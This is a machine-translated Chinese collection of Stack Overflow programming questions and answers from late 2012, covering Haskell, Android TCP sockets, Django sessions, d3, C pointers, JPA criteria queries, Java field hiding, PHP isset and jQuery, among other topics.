# haskell - 通过查看另一个列表来删除列表元素

> ID：14097630
> 
> 赞同：0
> 
> 时间：2012-12-31T05:01:42.743
> 
> 标签：haskell

我有两个清单。一个列表包含一些随机数据，另一个列表包含需要删除的第一个列表的索引。

例如，让我们考虑两个列表：

```
let a = [3,4,5,6,6,7,8]
let b = [1,3] 
```

那么，结果输出应该是`[3,5,6,7,8]`。数字 4 和 6 被删除，因为它们分别位于索引位置 1 和 3。

我是 Haskell 的新手，所以很难找到解决方案。

更新：以下代码使其工作

```
import Data.List
dele :: Eq a => [a] -> [Int] -> [a]
dele [] _ = []
dele x [] = x
dele x (y:ys) = dele (delete (x !! y) x) ys 
```

我只是想知道，有没有办法通过 map/fold 方式解决它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:28:15.880

```
deleteByIndex :: (Enum a, Eq a, Num a) => [a] -> [b] -> [b]
deleteByIndex r = map snd . filter (\(i, _) -> notElem i r) . zip [0..] 
```

`[0..]`产生一个无限列表`[0, 1, 2, 3, ...]`

`zip`使用此列表的值和表单中的输入列表构造一个对列表`[(0,x), (1, y), ...]`

`filter`需要一个函数`a -> Bool`。lambda 检查索引（对的第一个元素）是否在您的输入列表中`r`。

`map snd`返回每对 zip 列表的第二个元素。

`zip`, `filter`,`map`并`notElem`在[此处记录](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:44:31.223

在我的头顶上：

```
removeByIndex :: [Integer] -> [a] -> [a]
removeByIndex indices = map snd . filter notInIndices . zip [0..]
    where notInIndices (i,_) = i `notElem` indices 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-02T07:46:54.630

使用最近受到相当关注的镜头库的替代答案

```
import Control.Lens
>let a = [3,4,5,6,6,7,8]
>let b = [1,3]
>a^..elements (`notElem`b)
[3,5,6,7,8] 
```

(^..) 只是 toListOf 的中缀，可用于遍历结构并从其部分中创建列表。元素功能只允许您选择要包含的元素。

其他选项是 'traverse' 来遍历可遍历对象，'both' 来遍历 (,) 并且它们与 (.) 组合在一起，因此 traverse.both 将遍历 [(1,2), (3,4)] 例如。

> [(1,2), (3,4)]^..traverse.both [1,2,3,4]

# java - 如何在 Java 中将 TCP 发送按钮放入循环中？

> ID：14097634
> 
> 赞同：1
> 
> 时间：2012-12-31T05:02:23.737
> 
> 标签：java, android, loops, tcp

我正在尝试创建一个具有编辑文本视图和按钮的应用程序。此按钮将通过 TCP 连接将编辑文本中的任何内容发送到服务器。

我已经完成了编辑文本的发送，但是在我单击一次按钮后，应用程序崩溃了。我怎样才能把它放到一个循环中，以便我可以发送多条消息？这是我的来源

```
public class MainActivity extends Activity {

    //Handler h;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final EditText eText = (EditText) findViewById(R.id.address);
        final TextView tView = (TextView) findViewById(R.id.pagetext);
        final Button button = (Button) findViewById(R.id.ButtonGo);
                button.setOnClickListener(new Button.OnClickListener() {
                    public void onClick(View v) {
                        try {
                            Socket s = new Socket("192.168.0.117", 4447);
                            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
                            final BufferedWriter out = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
                            //send output msg
                            String outMsg = ((EditText)findViewById(R.id.address)).getText().toString().trim();
                            out.write(outMsg);
                            out.flush();
                            Log.i("TcpClient", "sent: " + outMsg);
                        } catch (UnknownHostException e) {
                            tView.setText(e.toString());
                            Log.v("Tcp",e.toString());
                        } catch (IOException e) {
                            tView.setText(e.toString());
                            Log.v("Tcp",e.toString());
                        }catch (Exception e) {
                            tView.setText(e.toString());

                        } 
                    }
                }); 
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T03:03:39.150

我通过使用两个不同的按钮来实现这一点。一个连接按钮和一个发送消息按钮。我认为当服务器尝试重新创建套接字时，TCP 连接中断，服务器发现异常并开始吓坏了。这是新代码。

```
 bConnect.setOnClickListener(new Button.OnClickListener() {
                public void onClick(View v) {
                    try {
                        Socket s = new Socket("192.168.0.117", 4447);
                        out = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
                        BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
                    } catch (UnknownHostException e) {
                        tView.setText(e.toString());
                        Log.v("Tcp",e.toString());
                    } catch (IOException e) {
                        tView.setText(e.toString());
                        Log.v("Tcp",e.toString());
                    }catch (Exception e) {
                        tView.setText(e.toString());

                    } 
                }
            });

            bSend.setOnClickListener(new Button.OnClickListener() {
                public void onClick(View v) {
                    try {
                        String outMsg = ((EditText)findViewById(R.id.address)).getText().toString().trim();
                        out.write(outMsg);
                        out.flush();
                        Log.i("TcpClient", "sent: " + outMsg);  
                    } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }

                    finally{

                    }
                    }

                }); 
```

# django - 使用 Django 会话存储登录用户

> ID：14097635
> 
> 赞同：4
> 
> 时间：2012-12-31T05:02:32.070
> 
> 标签：django, session, nosql, django-sessions

我正在创建一个以 REST 为中心的应用程序，它将对大多数特定领域的模型使用某种 NoSQL 数据存储。对于我打算围绕 REST 数据框架构建的主站点，我仍然想为用户、计费信息和其他域数据模型范围之外的元数据使用传统的关系数据库。

我被告知，如果我可以尽可能避免对同一请求同时对 RDBMS 和 NoSQL 数据存储执行 I/O，则这种方法是一个好主意。

我的问题：

1.  这是个好建议吗？（我假设是这样，但如果第一个前提是错误的，那么剩下的这些问题都是无用的。）
2.  我想尽可能多地缓存至少登录的用户。是否可以使用 Django 会话以安全、可靠正确和容错的方式执行此操作？理想情况下，我希望会话 API 成为一个安全的、直接的替代品，以尽可能少地与用户表交互来检索当前用户。我需要做哪些跑腿工作才能把所有东西都连接起来？
3.  如果这最终太麻烦，那么在不使用 django-nonrel 的情况下将用户信息存储在 NoSQL 存储中（即完全消除 RDBMS）有多容易？自定义身份验证/授权后端可以做到这一点吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-20T12:22:51.127

我正在考虑对我的应用程序使用相同的方法，我认为它通常是安全的，但需要特别注意解决缓存一致性问题。

Django 正常操作的方式是，当收到请求时，会针对 Session 表运行查询，以从请求中找到与 cookie 关联的会话。然后，当您访问时`request.user`，将对 User 表运行查询以查找给定会话的用户（如果有，因为 Django 支持匿名会话）。因此，默认情况下，Django 需要两个查询来将每个请求与一个用户相关联，这很昂贵。

Django session 的一个好处是它可以用作键值存储，而无需扩展任何模型类（与难以使用附加字段扩展的 User 类不同）。因此，您可以`request.session['email'] = user.email`在会话中存储其他数据。从某种意义上说，这是安全的，您从`request.session`字典中读取的内容肯定是您放在那里的内容，客户端无法更改这些值。因此，您确实可以使用这种技术来避免查询 User 表。

为避免查询 Session 表，您需要启用会话缓存（或使用 将会话数据存储在客户端 cookie 中`django.contrib.sessions.backends.signed_cookies`，这是安全的，因为此类 cookie 受到加密保护，不会被客户端修改）。

启用缓存后，您需要 0 个查询才能将请求与用户数据相关联。但问题是缓存一致性。如果您使用带有 write through 选项 ( `django.core.cache.backends.locmem.LocMemCache`with `django.contrib.sessions.backends.cached_db`) 的本地内存缓存，则会话数据将在每次修改时写入 DB，但如果它存在于缓存中，则不会从 DB 中读取。如果您有多个 Django 进程，这会带来一个问题。如果一个进程修改了会话（例如更改`session['email']`），其他进程仍然可以使用旧的缓存值。

您可以通过使用共享缓存（Memcached 后端）来解决它，它保证一个进程所做的更改对所有其他进程都是可见的。通过这种方式，您将使用对 Memcached 后端的请求替换对 Session 表的查询，这应该更快。

在客户端 cookie 中存储会话数据也可以解决缓存一致性问题。如果您修改 cookie 中的电子邮件字段，则客户端发送的所有未来请求都应该有一个新的电子邮件。虽然客户端可以故意发送一个旧 cookie，它仍然带有旧值。这是否是一个问题取决于应用程序。

# javascript - 在 d3js 中，如何通过单击堆栈栏来过滤数据

> ID：14097643
> 
> 赞同：0
> 
> 时间：2012-12-31T05:03:25.663
> 
> 标签：javascript, layout, d3.js

我正在尝试通过单击堆叠栏中的某个矩形栏来过滤数据。这个堆栈条是一个二维图，水平指标是年份，垂直指标是不同的产品收入，我想按特定年份的特定产品进行过滤。意味着当我单击整个图表的矩形条时，数据应按特定年份和特定产品过滤。

我的代码是：

```
metrics.on("click", function(d,i,j){
         d3.select(this)
         .style("fill","lightcoral")
         .style("stroke","red");
         fdata =rawdata.filter(function(d){return (d[xvalue]==_seriesA[i])&&(d[yvalue]==_seriesB[j])});
    }); 
```

但奇怪的是 j 的值总是未定义的，尽管如果我给它附加一个标题：

```
metrics.append("title").text(
            function(d,i,j) {
                return i + ' - '+j ;
            }); 
```

j 的值将被正确打印，“on”点击功能有什么特别之处吗？为什么我不能得到 j 的值？任何帮助将不胜感激......这让我整晚都疯狂......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:38:51.903

根据[文档](https://github.com/mbostock/d3/wiki/Selections#wiki-on)，第二个参数`.on()`是一个接受两个参数的函数，而不是三个。同样，它也不应该在您的第二个示例中起作用。

我认为您对数据之间的区别及其呈现方式感到困惑。该`.on()`功能将为您提供数据。您在代码中某处创建的比例获取该数据并将其映射到图形中`x`的`y`坐标（或者您直接使用没有比例的数据）。在`.on()`函数中，您使用数据的方式与创建图表时使用的方式完全相同。也就是说，数据项（`d`在您的代码中）包含您突出显示的特定位置的数据。

# meteor - Meteor 支持哪些无头浏览器？

> ID：14097644
> 
> 赞同：0
> 
> 时间：2012-12-31T05:03:36.423
> 
> 标签：meteor

我们知道Meteor[支持哪些桌面浏览器](https://stackoverflow.com/questions/10127211/what-web-browsers-are-supported-by-meteor-web-framework)，但官方支持哪些无头浏览器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-19T21:41:16.693

我使用过 Phantomjs，在 Meteorjs 中使用它没有发现任何问题。

至于对它的支持，请查看来自流星博客的这篇文章：http: [//meteor.com/blog/2012/08/08/search-engine-optimization](http://meteor.com/blog/2012/08/08/search-engine-optimization)

看起来确实...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T09:26:26.243

我从未读过任何关于无头浏览器支持 Meteor 的声明，但根据我自己使用[PhantomJS](http://phantomjs.org/)的经验，我很确定这将是一个安全的选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-10T20:04:05.070

我用过 casperjs。它适用于单浏览器测试。但是：请注意，casperjs/phantomjs 一次只能模拟一个浏览器。如果您想使用单独的无头浏览器测试多用户功能，您将不得不使用其他东西（或者可能在单独的 node.js 实例中运行多个 casperjs）。

尝试其他选项：

*   僵尸.js 似乎不起作用；处理模板似乎不够聪明，尽管也许你可以通过一些摆弄来让它工作。

*   ghost.py 在简单的流星页面加载上似乎也失败了，尽管我可能只是做错了什么。

*   我还没有尝试过 spynner.py、envjs 或其他。

# php - Wp-插入不工作

> ID：14097645
> 
> 赞同：0
> 
> 时间：2012-12-31T05:03:49.203
> 
> 标签：php, mysql, wordpress

我正在处理 wordpress 中的表单提交代码。我创建了一个注册表单。我添加了一个名为“用户”的表，并使用 wp-insert 查询进行插入。这是我的代码

```
$wpdb->insert( 'users', array( 'name' => 'abc', 'email'=>'abc@xyz.com', 'phone'=>546546545, 'cell'=>21432132, 'user_name'=>'abc', 'user_password'=>'987sdf554'), array('%s','%s','%d','%d','%s','%s')); 
```

我的表格字段是：1）user_id /*它是自动递增*/ 2）姓名 3）电子邮件 4）电话 5）手机 6）用户名 7）用户密码

谁能指导我这段代码有什么问题。它不工作。提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:06:02.577

试试这样的，

```
$table_name = $wpdb->prefix . "users";
$wpdb->query("INSERT INTO $table_name (name, email,..) VALUES($value1,$value2...)"); 
```

# c# - 使用 C# 在数据库上获取索引号时出错，显示 -1

> ID：14097646
> 
> 赞同：0
> 
> 时间：2012-12-31T05:03:55.923
> 
> 标签：c#, .net, mysql, sql

我在 C# 中编写了一个脚本，以使用 ComboBox 上的某个参数获取数据库的索引号。

```
private int category(string id) {
        int identity = 0;
        try
        {
            MySqlConnection conn = new MySqlConnection(connection.mysqlconnectionbuilder());
            conn.Open();
            MySqlCommand cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT kategori.no FROM kategori WHERE kategori.kategori = @id";
            cmd.Parameters.AddWithValue("@id", id);
            cmd.CommandType = CommandType.Text;
            identity = cmd.ExecuteNonQuery();
            conn.Close();
        }
        catch (MySqlException msqe)
        {
            Console.Write(msqe.ToString());
        }
        return identity;
    } 
```

我想根据名称示例获取索引号。"好莱坞电影" --> ID : 2 (in DB) 上面脚本的结果是-1。

如何解决？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:06:08.630

`ExecuteScalar()`如果要获取单个值，请使用。

```
identity = Convert.ToInt32(cmd.ExecuteScalar()); 
```

*   [**ExecuteScalar**方法（*示例*）](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executescalar.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:12:53.233

**[ExecuteNonQuery](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executenonquery%28v=VS.71%29.aspx)**将返回**受影响的行数。**

它用于插入、更新或删除。它返回一个整数，指定受影响的行数。

所以你需要使用**[ExecuteScalar](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executescalar.aspx)**它返回查询返回**的结果集中第一行的第一列**

*“对于 UPDATE、INSERT 和 DELETE 语句，返回值是受命令影响的行数。对于所有其他类型的语句，**返回值是 -1**。如果发生回滚，返回值也是 -1。 "*

```
identity = Int.Parse(cmd.ExecuteScalar()); 
```

# php - 如何在结帐单页送货地址部分添加客户地址属性？

> ID：14097648
> 
> 赞同：0
> 
> 时间：2012-12-31T05:04:52.513
> 
> 标签：php, zend-framework, magento

我使用 Hwg 属性管理器扩展添加了一个客户地址属性（选择类型）。它在后端和前端工作正常。我想将该属性添加到结帐单页送货地址部分。有人可以帮我解决这个问题。

[Hwg 属性管理器扩展](http://www.mediafire.com/download.php?qltm5vd8n28m7bz)

# javascript - Excel 的 ActiveXObject Javascript 编程参考

> ID：14097649
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:05:03.630
> 
> 标签：javascript, excel, reference, activexobject

我正在寻找从 Javascript 使用 ActiveXObjects 的深入教程。有谁知道参考资料，以便我可以学习如何使用 ActiveXObjects 编写 Excel 文档？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:18:21.933

这是[Excel 对象模型文档](http://msdn.microsoft.com/en-us/library/ee861528.aspx)。它可能比 JScript 更专注于 .NET，但它都基于相同的 COM 对象，因此它在大多数情况下应该仍然适用

# c - 指向字符串的指针数组

> ID：14097651
> 
> 赞同：4
> 
> 时间：2012-12-31T05:05:30.283
> 
> 标签：c, arrays

在 C 编程中，我们无法使用 scanf() 函数获取指针数组的值，但是

```
int main()
{
char *names[6];
int loop;
scanf("%s",names[1]);
printftf("\n%s",names[1]);
} 
```

它正在工作，当我将输入作为程序提供时，我认为它正在存储输入，但它会将输出正确打印为给定的输入。之后它给出了分段错误......但是当我在循环中做同样的事情时获得 6 个字符

```
int main()
{
 char *names[6];
 int loop;
 for(loop=0;loop<6;loop++)
 scanf("%s",names[1]);
 for(loop=0;loop<6;loop++)
 printf("\n%s",names[1]);
 } 
```

它不起作用，请给我答案...

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-31T05:14:47.077

问题是您没有为这些*名称*分配任何空间。如果您打算将数组中的每个元素与`scanf`.

```
char* names[6];
for( int i = 0; i < 6; ++i )
    names[i] = malloc( 256 * sizeof *names[i] ); // or some other max value

scanf( "%s", names[1] ); 
```

否则，这些*指针*将指向您内存中的任何位置，并且尝试读/写这些位置最终将导致*分段错误*。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-31T05:57:54.493

在您的代码`names`中是一个由 6 个指向 char 的指针组成的数组。现在这些指针中的每一个都可以存储新字符串的起始点（第一个字符的地址）。这意味着您可以在`names`变量中存储 6 个不同字符串的起始地址。

但是当您使用循环初始化这些字符串中的每一个时，您需要通知机器每个字符串可能有多长，以便它可以分配一个连续的地址块，然后可以将其第一个地址存储在您的指针中以**引用**您的细绳。因此，您必须**分配**一个您认为足以存储字符串的大小（例如：256 个字节，1 个字节为 1 个字符）。如果没有这个，机器不知道将字符串的所有字节存储在哪里，并且由于非法内存访问而引发分段错误。

因此，要做到这一点，必须为**6 个指针中的每一个分配一些空间来存储字符串。**这将在您的循环中使用`malloc()`. 基于@K-ballo 的代码：

```
char* names[6];
int max_length = 256; // The maximum length you expect
for( int i = 0; i < 6; ++i )
    names[i] = malloc( max_length * sizeof(char) ); // allocates max_length number of bytes

scanf( "%s", names[1] ); 
```

所以现在你基本上有 6 个不同的`max_length`连续字符地址块，每个块都由`names[i]`. 当您执行此操作时，`scanf()`它会从标准输入读取字节，然后将这些字节放入由名称 [1] 引用的内存中的这些分配字节中。

一开始我很难理解这一切，所以只是认为一个详尽的解释会有所帮助。:)

# jpa - JPA 条件查询中的条件 where 子句

> ID：14097652
> 
> 赞同：11
> 
> 时间：2012-12-31T05:05:31.187
> 
> 标签：jpa, where-clause, predicate, criteria-api, conditional-statements

我面临 JPA 标准查询的问题。如何使用 if else 在我的条件查询中添加多个 where 子句...

我的要求是：

```
CriteriaBuilder builder = getEm().getCriteriaBuilder();
CriteriaQuery<Object> query = builder.createQuery(Object.class);

// From
Root<EntityClass> entity= query.from(EntityClass.class);
// Select
query.multiselect(entity.get("id").get("col1"),entity.get("id").get("col2"));
// Where
Predicate p1 = builder.and(builder.equal(entity.get("col3"), value3));
Predicate p2 = builder.and(builder.equal(entity.get("col4"), value4));
Predicate p3 = builder.and(builder.equal(entity.get("col5"), value5));
if(someCondition1){
    query.where(p1);
}else if(someCondition2){
    query.where(p1);
}
query.where(p3); 
```

在上面的代码中，语句 query.where(p3); 替换先前设置的 where 子句条件 p1 和 p2。我发现的替代方案如下所示

```
if(someCondition1){
    query.where(p1, p3);
}else if(someCondition2){
    query.where(p2, p3);
}else{
    query.where(p3);
} 
```

但这不是一个好方法，因为当有很多 if-else 时，编写重复代码会变得非常糟糕。任何人都可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2014-07-01T20:41:54.720

您可以创建一个谓词数组来存储条件谓词，然后将其添加到`WHERE`子句中：

```
List<Predicate> predList = new LinkedList<Predicate>();
if (someCondition1) {
    predList.add(p1);
} else if (someCondition2) {
    predList.add(p2);
}
predList.add(p3);
Predicate[] predArray = new Predicate[predList.size()];
predList.toArray(predArray);
query.where(predArray); 
```

这允许动态添加任何类型的谓词。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-31T06:42:09.037

像这样的东西：

```
Predicate p;
Predicate p3 = builder.equal(entity.get("col5"), value5);
if(someCondition1){
    p = builder.equal(entity.get("col3"), value3);
}else if(someCondition2){
    p = builder.equal(entity.get("col4"), value4);
}
if (p != null) p = builder.and(p, p3);
else p = p3;
query.where(p); 
```

因此，不要在每个 if 中调用 where ，只需构建一个完整的表达式并在最后调用 where 一次。

# singleton - 单例类与具有静态成员的类

> ID：14097656
> 
> 赞同：10
> 
> 时间：2012-12-31T05:06:02.750
> 
> 标签：singleton, static-members

尽管关于该主题的主题很多，但我仍然不清楚何时选择哪种方法。我希望通过讨论一个具体的例子，我最终会“明白”。

注意：我的语言是 Cocoa，尽管一般问题不是特定于语言的。

我有一个 TaskQueue 类，我想用它来：

*   从我的代码中的任何地方访问以添加或删除计划任务
*   定期自动处理计划任务

首次使用 TaskQueue 时，我希望 TaskQueue 启动一个线程，然后定期唤醒以处理任务。

显然，我至少需要两个变量：

*   存储任务的数组
*   处理任务的线程实例

由于我只想要一个任务队列和一个线程来处理这些任务，我有两种选择：

1.  使 TaskQueue 成为单例类（例如使用[http://www.cocoawithlove.com/2008/11/singletons-appdelegates-and-top-level.html](http://www.cocoawithlove.com/2008/11/singletons-appdelegates-and-top-level.html)中所述的 CWL_DECLARE_SINGLETON_FOR_CLASS_WITH_ACCESSOR ，我相信我将不得不修改 CWLSynthesizeSingleton。 h 文件以在初始化时启动线程。）

2.  任务数组和线程实例都是静态的（按照此处建议的方法：[如何在 Objective-C 中声明类级属性？](https://stackoverflow.com/questions/695980/how-do-i-declare-class-level-properties-in-objective-c)）

在这种特定情况下，显然有一种方法比另一种方法更好吗？如果是这样，为什么？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-12-31T05:11:01.750

主要区别很简单，例如：

*   使用单例，您可以为委托和回调传递对象
*   使用单例，您可以实现接口并派生它
*   使用单例，您可以使用工厂模式来构建您的实例

如果您不需要它们中的任何一个，例如必须在代码周围访问的全局功能，那么您可以使用静态方法。

我个人更喜欢使用静态方法，除非我有明确的理由使用单例实例（例如具有通用接口但实现不同）。

请注意，将静态方法重构为单例实例是一个非常简单的过程，因此，如果您发现需要后者，您将轻松重构它（然后您有 C 预处理器，一个`#define`几乎就足够了）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-07-31T13:02:09.357

Singleton 是一种**设计模式**，Static 是使对象全局化的**C# 关键字。**

> 单例 = 静态 + 线程安全 + 延迟加载 + 迭代器模式

这是一个很好的演示文稿，其中用示例代码解释了差异。 [https://www.youtube.com/watch?v=csQdTkEdhME](https://www.youtube.com/watch?v=csQdTkEdhME)

# yui - 如何使 YUI 3 淡入淡出持续时间工作？

> ID：14097662
> 
> 赞同：1
> 
> 时间：2012-12-31T05:06:30.813
> 
> 标签：yui, yui3

一个例子是：

[http://jsfiddle.net/a9j28/18/](http://jsfiddle.net/a9j28/18/)

在[O'Reilly 的 YUI 3 Cookbook 中](http://books.google.com/books?id=b-h_XNYCskgC&pg=PA72&dq=yui%203%20fade&hl=en&sa=X&ei=XRfhULa5CYPk2AXj1YGYDw&ved=0CDYQ6AEwAA)，据说

```
 Y.all('.ad').hide({
        duration: 6.0
    }); 
```

应该在 6.0 秒内淡出元素，但它仍然淡出相当快，更像是默认行为。为什么/如何使它真正起作用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T06:01:40.047

我是 YUI 3 Cookbook 的作者。我在设计和测试该示例时可能犯了一个错误——如果是这样，我为此道歉！

为了让示例变慢，您当然可以调用`transition()`而不是`hide()`-- 设置`opacity`to `0`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-03T16:20:39.840

我会说某处有一个错误。

如果您查看那里的代码：http: [//yuilibrary.com/yui/docs/api/files/transition_js_transition-native.js.html#l547](http://yuilibrary.com/yui/docs/api/files/transition_js_transition-native.js.html#l547)。

您会看到，当加载“过渡”模块时，您可以使用过渡名称、配置和回调调用 hide 方法。和调用transition方法完全一样。

但：

1）如果要隐藏，则需要在配置对象中将不透明度设置为 0。这很奇怪，因为该方法称为隐藏。

2) 修改后的（通过转换模块）方法看起来在 NodeList 上不可用。在您的示例中，您仍在调用以下定义的 hide 方法：http: [//yuilibrary.com/yui/docs/api/files/node_js_node-view.js.html#l191](http://yuilibrary.com/yui/docs/api/files/node_js_node-view.js.html#l191)

# gwt - 关闭特定类的混淆？

> ID：14097664
> 
> 赞同：1
> 
> 时间：2012-12-31T05:07:15.607
> 
> 标签：gwt

有没有办法为单个类关闭混淆？

我需要这样做，因为我有一个本机 ios 应用程序在 UIWebView 中运行我的应用程序 - 我需要能够调用我的 GWT 类方法之一 - 但由于这些类被混淆了，我不能做这个。

有任何想法吗？

我能想到的另一个选择是自己编写一个纯 javascript 类，将数据写入 html5 存储。然后，我的本机应用程序将调用手动创建的 javascript 方法。然后我的应用程序可以从存储中获取数据并开始使用。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T10:49:51.137

您可能正在寻找类似于[gwt-export](http://code.google.com/p/gwt-exporter/)功能而不是混淆关闭功能的东西。

检查您的问题是否类似于[如何在 GWT 中公开类功能](https://stackoverflow.com/questions/10029656/how-to-expose-class-functionality-in-gwt)

# java - Java 继承 - this 关键字

> ID：14097666
> 
> 赞同：5
> 
> 时间：2012-12-31T05:08:50.400
> 
> 标签：java, inheritance, overriding, this

我在网上搜索了类似的问题，但找不到。所以，在这里发帖。

在下面的程序中，为什么“i”的值被打印为 100？

AFAIK 'this' 指的是当前对象；在这种情况下是“TestChild”，并且类名也正确打印。但是为什么实例变量的值不是200呢？

```
public class TestParentChild {
    public static void main(String[] args) {
        new TestChild().printName();
    }
}

class TestChild extends TestParent{
    public int i = 200;
}

class TestParent{
    public int i = 100;
    public void printName(){
        System.err.println(this.getClass().getName());
        System.err.println(this.i); //Shouldn't this print 200
    }
} 
```

此外，以下输出与我预期的一样。当我从父类调用“ **this.test() ”时，调用子类方法。**

```
public class TestParentChild {
    public static void main(String[] args) {
        new TestChild().printName();
    }
}

class TestChild extends TestParent{
    public int i = 200;
    public void test(){
        System.err.println("Child Class : "+i);
    }

}

class TestParent{
    public int i = 100;
    public void printName(){
        System.err.println(this.getClass().getName());
        System.err.println(this.i); //Shouldn't this print 200
        this.test();
    }
    public void test(){
        System.err.println("Parent Class : "+i);
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-31T05:11:54.357

Java 没有虚拟字段，所以`i`字段`printName`总是指`TestParent.i`代而不是任何后代子代。

Java中通过继承实现的多态性只发生在方法上，所以如果你想要你描述的行为，那么你会想要这个：

```
class TestChild extends TestParent{

    private int i = 200;

    @Override
    public int getI() { return this.i; }
}

class TestParent{

    private int i = 100;

    public int getI() { return this.i; }

    public void printName(){
        System.err.println( this.getClass().getName() );
        System.err.println( this.getI() ); // this will print 200
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:13:12.643

因为 Java 中的字段不是继承的。使用您的声明，您已经有效地声明了两个名为 的*不同*字段`i`，并且 的实例`TestChild`将同时拥有这两个字段。`TestParent`编译时，其方法中的引用将`i`始终引用`TestParent.i`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-31T05:17:37.640

没有办法覆盖类变量。

您不会覆盖 Java 中的类变量，而是隐藏它们。覆盖是实例方法，隐藏不同于覆盖。

在您给出的示例中，通过在类中声明名为“i”`TestChild`的类变量，您隐藏了它将从其超类继承的`TestParent`具有相同名称“i”的类变量。以这种方式隐藏变量不会影响超类中类变量“i”的值`TestParent`

要获得所需的行为，您只需覆盖该`getI()`方法

```
class TestChild extends TestParent{

    private int i = 200;

    @Override
    public int getI() {
         return this.i;
    }
} 
```

# php - Why check if( isset($something) && $something )?

> ID：14097667
> 
> 赞同：0
> 
> 时间：2012-12-31T05:09:24.383
> 
> 标签：php, if-statement, isset

I just saw something like the following in a php file and I'm wondering why you would check both.

```
if( isset($var) && $var ) {

// Code

} 
```

Does this make sense?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T05:13:32.127

`isset`- 如果存在且不为 NULL，则返回 TRUE，否则为 FALSE。

在上面例如。为了`$var = 0`

isset 的第一个条件将返回 true，而第二个条件将返回 false。

因此，如果您要检查变量是否已设置并且具有非零值，则将使用上述条件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T05:16:56.617

`isset`如果定义了变量，将返回 true，而如果变量不为空或为零，则默认布尔测试将返回 true。你想`isset`在你测试它的值之前使用它来防止未定义的变量错误。

```
if ($var) // returns true if the variable isn't empty or zero

if (isset($var)) // returns true if the variable is defined and not NULL 
```

如果 php 错误报告级别包括通知 (E_NOTICE)，测试未定义变量将报告未定义变量错误。

但是，您不需要`isset`在函数之前使用`empty`。

如果变量不存在，则不会生成警告。这意味着`empty()`本质上是简洁的等价于`!isset($var) || $var == false`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:20:51.483

用“通知”报告为错误在 php 中编写代码是一种很好的做法。如果您检查变量的值，但未设置该变量，则可能意味着您有错字，它将被标记为“错误”。然后，您可以修复您的错字并继续前进。如果您没有通知，那么您可能永远不会发现错字，并且变量将与空/null/false 相同（取决于您的比较），因此您可能永远不会得到“真实”条件。所以打开通知并为自己节省数小时的调试时间。

但有时您可能知道某个变量可能未设置 - 为了避免将其报告为错误，您首先检查该变量是否“设置”。这就是您在代码示例中阅读的内容。

# jquery - 选择特定范围以显示用户输入

> ID：14097668
> 
> 赞同：0
> 
> 时间：2012-12-31T05:09:35.260
> 
> 标签：jquery

我有这段代码，它可以在单击按钮时动态创建 div。在创建的 div 中，将要求用户输入并提交。提交时，它会在同一个 div 中显示输入，然后创建另一个 div 来做同样的事情。显示的值应该保留在每个 div 中，每个 div 应该只显示它​​的相关输入。

```
var i=1;
$(document).ready(function(){     
   $("#addCase").submit(function(event) {
    event.preventDefault(); 
    //adding div
    var idName ="Div_num_"+i;   
        $('.newValue').show(); 
        $('<div />').attr({
          'id' : idName       
          }).appendTo('#container').load("content.php", function() {   
              $('<h3>'+idName+'</h3>').prependTo($(this));    
            }); 
      i++;
    //showing input
      var $form = $("#addCase"),
      url = $form.attr("action"),      
      textInserted=$("#name").val();    
      $.post(url,function(){
        $(".insertedText").append(textInserted);   
      });
      $("#inputText").remove();
   });   
}); 
```

html：

```
<form id="addCase" method="post" action="">
  <div id="container"></div>
  <input id="addNew" type="submit" value="Add Case">        
</form> 
```

内容.php

```
<div id="inputText"><p>Text :<input name="name" id="name" type="text"/></p></div>
<div style="display:none;" class="newValue"><p> Inserted Text :<span class="insertedText"></span></p></div> 
```

我不知道如何选择相关跨度，以便仅插入的新值将仅显示在它的位置。

有人可以告诉我如何正确地做到这一点。预先感谢您的任何帮助。

